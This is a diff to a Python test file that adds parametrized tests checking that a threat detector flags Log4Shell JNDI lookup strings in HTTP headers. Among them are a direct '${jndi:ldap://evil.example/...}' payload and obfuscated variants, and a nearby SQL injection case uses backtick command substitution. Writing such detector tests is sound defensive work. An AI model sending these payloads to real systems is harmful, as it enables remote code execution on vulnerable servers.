@@ -934,6 +934,27 @@ async def test_log4shell_jndi_payload_is_detected_in_query_param(
     )
 
 
+LOG4SHELL_JNDI_HEADER_PAYLOADS = [
+    pytest.param("${jndi:ldap://evil.example/a}", id="log4shell_direct_ldap"),
+    pytest.param("${lower:j}ndi", id="log4shell_obfuscated_lower_bare"),
+    pytest.param("${::-j}ndi", id="log4shell_obfuscated_default_value_bare"),
+]
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("payload", LOG4SHELL_JNDI_HEADER_PAYLOADS)
+async def test_log4shell_jndi_payload_is_detected_in_header(
+    payload: str,
+) -> None:
+    result = await sus_patterns_handler.detect(
+        content=payload, ip_address="203.0.113.9", context="header"
+    )
+    assert result["is_threat"] is True
+    assert any(
+        threat.get("category") == "cmd_injection" for threat in result["threats"]
+    )
+
+
 SQL_KEYWORD_GLUED_EXEMPTION_BYPASS_CASES = [
     pytest.param("x`id` JOIN accounts", id="backtick_ambiguous_keyword_not_glued"),
 ]
